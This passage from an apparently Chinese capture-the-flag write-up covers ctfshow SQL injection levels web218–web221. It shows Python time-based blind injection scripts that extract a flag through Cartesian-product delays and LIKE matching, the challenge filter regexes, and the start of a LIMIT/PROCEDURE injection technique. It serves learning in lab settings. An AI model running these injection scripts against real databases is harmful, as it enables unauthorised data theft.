class="token punctuation" style="color:#393A34">(</span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> j</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            flag </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">j</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">break</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token string" style="color:#e3116c">&quot;ip&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;&#x27;&#x27;) or if(ascii(substr((select group_concat(flagaac) from ctfshow_flagxc),</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">i</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,1))&lt;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">j</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">sleep_rep</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,&#x27;False&#x27;)#&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                   </span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;debug&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">try</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">post</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">url</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">data</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">timeout</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">0.5</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">except</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token builtin">max</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        time</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sleep</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0.2</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web219">web219<a href="#web219" class="hash-link" aria-label="Direct link to web219" title="Direct link to web219">​</a></h3>
<p>返回逻辑</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">    //屏蔽危险分子</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    function waf($str){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return preg_match(&#x27;/sleep|benchmark|rlike/i&#x27;,$str);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>啊这rlike我的rlike</p>
<p>好吧，开始用笛卡尔积</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> time</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">url</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;http://f6ad04f0-3fd9-4eb9-9dc9-78cfaa9f5000.challenge.ctf.show/api/index.php&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">60</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    lenth </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin">min</span><span class="token punctuation" style="color:#393A34">,</span><span class="token builtin">max</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">32</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">128</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">True</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        j </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">max</span><span class="token operator" style="color:#393A34">-</span><span class="token builtin">min</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">//</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> j</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            flag </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">j</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">break</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># payload=f&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))&lt;{j},(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># payload=f&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxca&#x27;),{i},1))&lt;{j},(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payload</span><span class="token operator" style="color:#393A34">=</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;if(ascii(substr((select group_concat(flagaabc) from ctfshow_flagxca),</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">i</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,1))&lt;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">j</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        data</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token string" style="color:#e3116c">&#x27;ip&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token string" style="color:#e3116c">&#x27;debug&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">try</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            r</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">post</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">url</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">data</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">timeout</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">0.15</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token builtin">min</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">except</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token builtin">max</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        time</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sleep</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0.1</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web220">web220<a href="#web220" class="hash-link" aria-label="Direct link to web220" title="Direct link to web220">​</a></h3>
<p>时间盲注结束！太折磨了！！</p>
<p>返回逻辑</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">    //屏蔽危险分子</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    function waf($str){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return preg_match(&#x27;/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i&#x27;,$str);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>可以注意到过滤了ascii和substr，之前说过可以用like</p>
<p>继续笛卡尔积</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> time</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">url</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;http://fd9d2056-9452-448e-b2a6-aeb1c0dda361.challenge.ctf.show/api/index.php&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">table </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;0123456789abcdef-{},_&quot;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;ctfshow{&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">60</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> j </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> table</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;if((select flagaabcc from ctfshow_flagxcac limit 0,1) like &#x27;{}&#x27;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)&quot;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">format</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> j </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;%&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        data</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token string" style="color:#e3116c">&#x27;ip&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token string" style="color:#e3116c">&#x27;debug&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">try</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">post</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">url</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> data</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> timeout</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">0.15</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">except</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            flag </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">break</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        time</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sleep</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0.2</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web221">web221<a href="#web221" class="hash-link" aria-label="Direct link to web221" title="Direct link to web221">​</a></h3>
<p>描述：limit注入</p>
<p>查询语句</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  //分页查询</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  $sql = select * from ctfshow_user limit ($page-1)*$limit,$limit;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>返回逻辑</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//TODO:很安全，不需要过滤</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//拿到数据库名字就算你赢</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>百度看看用法</p>
<div class="language-mysql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-mysql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">select * from tableName limit i,n</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># tableName：表名</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># i：为查询结果的索引值(默认从0开始)，当i=0时可省略i</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># n：为查询结果返回的数量</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># i与n之间使用英文逗号&quot;,&quot;隔开</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">limit n 等同于 limit 0,n</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这里可以看P神的文章 <a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html" target="_blank" rel="noopener noreferrer">https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html</a></p>
<p>里面说到：</p>
<p>在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO除非有写入shell的权限，否则是无法利用的，那么使用PROCEDURE函数能否注入呢？ Let’s give it a try:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mysql&gt; SELECT field FROM table where id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE ANALYSE(1); </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ERROR 1386 (HY000): Can&#x27;t use ORDER clause with this procedure</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>ANALYSE可以有两个参数：</p>
